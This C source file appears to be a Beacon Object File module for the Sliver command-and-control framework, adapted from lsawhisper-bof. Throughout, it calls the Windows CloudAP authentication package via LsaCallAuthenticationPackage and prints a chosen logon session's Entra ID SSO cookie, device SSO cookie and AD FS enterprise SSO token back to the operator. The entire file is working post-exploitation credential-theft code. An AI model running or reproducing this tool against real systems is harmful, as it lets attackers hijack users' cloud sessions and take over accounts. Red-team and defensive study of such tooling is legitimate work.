/*
 * lsa-whisperer BOF - CloudAP Module
 * Handles: ssocookie, devicessotoken, enterprisesso, info
 *
 * Uses LsaCallAuthenticationPackage with CloudAP authentication package
 * to extract Azure/Entra ID SSO tokens and query cloud provider state.
 *
 * Original: https://github.com/dazzyddos/lsawhisper-bof
 * Adapted for Sliver armory integration
 */

#include "../../include/bofdefs.h"
#include "../../include/lsa_structs.h"

/* Forward declarations from common */
extern BOOL ParseLUID(const char* str, PLUID luid);
extern BOOL EnableTcbPrivilege(void);
extern NTSTATUS LsaConnect(PHANDLE hLsa, BOOL trusted);
extern NTSTATUS LsaLookupPackage(HANDLE hLsa, const char* packageName, PULONG packageId);
extern void PrintHexBytes(const char* label, PUCHAR data, ULONG length);

/* ============================================================
 * DoGetSSOCookie - Retrieve Entra ID SSO cookie
 * ============================================================ */

void DoGetSSOCookie(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Get SSO Cookie (Entra ID)\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, CLOUDAP_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CloudAP package not found: 0x%08x\n", status);
        BeaconPrintf(CALLBACK_ERROR, "[-] Machine may not be Azure AD joined\n");
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    CLOUDAP_GET_SSO_COOKIE_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = CloudApGetSsoCookieType;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &response, &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetSSOCookie failed: status=0x%08x sub=0x%08x\n", status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PCLOUDAP_GET_SSO_COOKIE_RESPONSE cookieResp = (PCLOUDAP_GET_SSO_COOKIE_RESPONSE)response;

    if (cookieResp->CookieLength > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SSO Cookie retrieved successfully!\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Cookie length: %u\n", cookieResp->CookieLength);

        /* Convert wide cookie to multibyte for output */
        int mbLen = WideCharToMultiByte(CP_UTF8, 0, cookieResp->Cookie,
                                        cookieResp->CookieLength / sizeof(WCHAR),
                                        NULL, 0, NULL, NULL);
        if (mbLen > 0) {
            char* mbBuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mbLen + 1);
            if (mbBuf) {
                WideCharToMultiByte(CP_UTF8, 0, cookieResp->Cookie,
                                    cookieResp->CookieLength / sizeof(WCHAR),
                                    mbBuf, mbLen, NULL, NULL);
                mbBuf[mbLen] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "[+] SSO Cookie:\n%s\n", mbBuf);
                HeapFree(GetProcessHeap(), 0, mbBuf);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No SSO cookie available for this session\n");
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoGetDeviceSSOToken - Extract device-level SSO credentials
 * ============================================================ */

void DoGetDeviceSSOToken(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Get Device SSO Cookie\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, CLOUDAP_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CloudAP package not found: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    CLOUDAP_GET_SSO_COOKIE_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = CloudApGetDeviceSsoCookieType;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &response, &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetDeviceSSOCookie failed: status=0x%08x sub=0x%08x\n", status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PCLOUDAP_GET_SSO_COOKIE_RESPONSE cookieResp = (PCLOUDAP_GET_SSO_COOKIE_RESPONSE)response;

    if (cookieResp->CookieLength > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Device SSO Cookie retrieved!\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Cookie length: %u\n", cookieResp->CookieLength);

        int mbLen = WideCharToMultiByte(CP_UTF8, 0, cookieResp->Cookie,
                                        cookieResp->CookieLength / sizeof(WCHAR),
                                        NULL, 0, NULL, NULL);
        if (mbLen > 0) {
            char* mbBuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mbLen + 1);
            if (mbBuf) {
                WideCharToMultiByte(CP_UTF8, 0, cookieResp->Cookie,
                                    cookieResp->CookieLength / sizeof(WCHAR),
                                    mbBuf, mbLen, NULL, NULL);
                mbBuf[mbLen] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Device SSO Cookie:\n%s\n", mbBuf);
                HeapFree(GetProcessHeap(), 0, mbBuf);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No device SSO cookie available\n");
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoGetEnterpriseSSOToken - Extract AD FS enterprise SSO tokens
 * ============================================================ */

void DoGetEnterpriseSSOToken(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Get Enterprise SSO Token (AD FS)\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, CLOUDAP_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CloudAP package not found: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    CLOUDAP_GET_SSO_COOKIE_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = CloudApGetEnterpriseSsoCookieType;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &response, &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetEnterpriseSSOToken failed: status=0x%08x sub=0x%08x\n", status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PCLOUDAP_GET_SSO_COOKIE_RESPONSE cookieResp = (PCLOUDAP_GET_SSO_COOKIE_RESPONSE)response;

    if (cookieResp->CookieLength > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Enterprise SSO Token retrieved!\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token length: %u\n", cookieResp->CookieLength);

        int mbLen = WideCharToMultiByte(CP_UTF8, 0, cookieResp->Cookie,
                                        cookieResp->CookieLength / sizeof(WCHAR),
                                        NULL, 0, NULL, NULL);
        if (mbLen > 0) {
            char* mbBuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mbLen + 1);
            if (mbBuf) {
                WideCharToMultiByte(CP_UTF8, 0, cookieResp->Cookie,
                                    cookieResp->CookieLength / sizeof(WCHAR),
                                    mbBuf, mbLen, NULL, NULL);
                mbBuf[mbLen] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Enterprise SSO Token:\n%s\n", mbBuf);
                HeapFree(GetProcessHeap(), 0, mbBuf);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No enterprise SSO token available\n");
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoGetCloudInfo - Query cloud provider status
 * ============================================================ */

void DoGetCloudInfo(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: Cloud Provider Info\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, CLOUDAP_NAME_A, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CloudAP package not found: 0x%08x\n", status);
        BeaconPrintf(CALLBACK_ERROR, "[-] Machine may not be Azure AD / Entra ID joined\n");
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] CloudAP authentication package found!\n");

    CLOUDAP_GET_PROVIDER_INFO_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = CloudApGetProviderInfoType;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa, packageId,
        &request, sizeof(request),
        &response, &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetProviderInfo failed: status=0x%08x sub=0x%08x\n", status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PCLOUDAP_GET_PROVIDER_INFO_RESPONSE infoResp = (PCLOUDAP_GET_PROVIDER_INFO_RESPONSE)response;

    if (infoResp->InfoLength > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Cloud Provider Info:\n");

        int mbLen = WideCharToMultiByte(CP_UTF8, 0, infoResp->Info,
                                        infoResp->InfoLength / sizeof(WCHAR),
                                        NULL, 0, NULL, NULL);
        if (mbLen > 0) {
            char* mbBuf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, mbLen + 1);
            if (mbBuf) {
                WideCharToMultiByte(CP_UTF8, 0, infoResp->Info,
                                    infoResp->InfoLength / sizeof(WCHAR),
                                    mbBuf, mbLen, NULL, NULL);
                mbBuf[mbLen] = '\0';
                BeaconPrintf(CALLBACK_OUTPUT, "%s\n", mbBuf);
                HeapFree(GetProcessHeap(), 0, mbBuf);
            }
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No cloud provider info available\n");
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * BOF Entry Point
 * ============================================================ */

#ifdef BOF
void go(char* args, int len) {
    datap parser;
    char* command = NULL;
    char* luidStr = NULL;
    LUID targetLuid = { 0, 0 };

    BeaconDataParse(&parser, args, len);
    command = BeaconDataExtract(&parser, NULL);

    if (command == NULL || strlen(command) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No command specified. Use: ssocookie, devicessotoken, enterprisesso, info\n");
        return;
    }

    luidStr = BeaconDataExtract(&parser, NULL);
    if (luidStr && strlen(luidStr) > 0) {
        ParseLUID(luidStr, &targetLuid);
    }

    if (_stricmp(command, "ssocookie") == 0) {
        DoGetSSOCookie(&targetLuid);
    }
    else if (_stricmp(command, "devicessotoken") == 0) {
        DoGetDeviceSSOToken(&targetLuid);
    }
    else if (_stricmp(command, "enterprisesso") == 0) {
        DoGetEnterpriseSSOToken(&targetLuid);
    }
    else if (_stricmp(command, "info") == 0) {
        DoGetCloudInfo(&targetLuid);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unknown command: %s\n", command);
        BeaconPrintf(CALLBACK_ERROR, "[-] Valid commands: ssocookie, devicessotoken, enterprisesso, info\n");
    }
}
#endif
